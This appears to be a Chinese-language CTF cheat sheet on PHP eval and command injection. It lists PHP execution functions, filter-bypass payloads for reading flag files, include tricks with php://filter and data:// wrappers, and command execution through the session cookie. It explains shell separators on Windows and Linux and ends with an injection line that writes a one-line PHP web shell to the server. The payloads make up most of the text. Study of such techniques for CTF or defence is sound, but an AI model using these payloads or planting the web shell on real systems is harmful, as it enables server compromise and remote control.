
**用eval执行Linux命令**

## eval执行（注意需加分号）

注入方式例如:/?cmd=system('ls')

request = post + get

- `system()`

	对某些指令进行执行的函数，比如：ls、cat、whoami、ifconfig等指令

- `passthru()`

	与system用法基本一致，在system函数被过滤后考虑使用

- `exec()`

  不回显，一般使用管道符`| tee（覆盖文件）或 | tee -a（追加文件）或  >`导入文件中访问 

- `shell_exec()` 

- `popen()` 

- `proc_open()` 

- `pcntl_exec()`

- 反引号

- `$()`   ` //￥加圆括号`

- `var_dump(`\`nl%20/f???\`);`

- `printf(`\`c\at+/fffffffffflagafag\`);`

用find命令找flag文件
```
find / -name flag.txt
```

**常用payload**

```
echo `nl flag.php`；

system()

passthru()

echo`strings%09f*`;

param=`$_GET[1]`;&1=bash
```

**配合文件包含**

```
用文件包含include()，include可以无括号包含，分号`;`可以用`?>`代替，与前面形成闭合，这样就可以做到参数逃逸

c=include%09$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php

?c=include%09$_GET[a]?>&a=data://,<?php eval(system('cat flag.php'));?>

传参时不能用双引号
```

## PHP短标签

```
<?=$a?>
<?=(表达式)?> 
就相当于 
<?php echo $a?> 
<?php echo (表达式)?>

(注意：这种写法在php配置中默认关闭了的,如果要正常输出，需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。)
```

**通过cookie命令执行**

```
c=session_start();system(session_id());
passid=ls
```

##### Windows系统支持的管道符如下：

1. “|”：直接执行后面的语句。

2. “||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。

3. “&”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。

4. “&&”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真

   

##### Linux系统支持的管道符如下：

1. “;”：执行完前面的语句再执行后面的语句。

2. “|”：显示后面语句的执行结果。

3. “||”：当前面的语句执行出错时，执行后面的语句。

4. “&”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。

5. “&&”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行

   

#### 思路一：直接通过管道符拼接，使用命令查看flag

#### 思路二：通过重定向，向服务器注入一句话木马，获得shell,再用蚁剑连接
```
127.0.0.1&echo -e "<?php @eval($_POST['shell']);?>" > shell.php
```
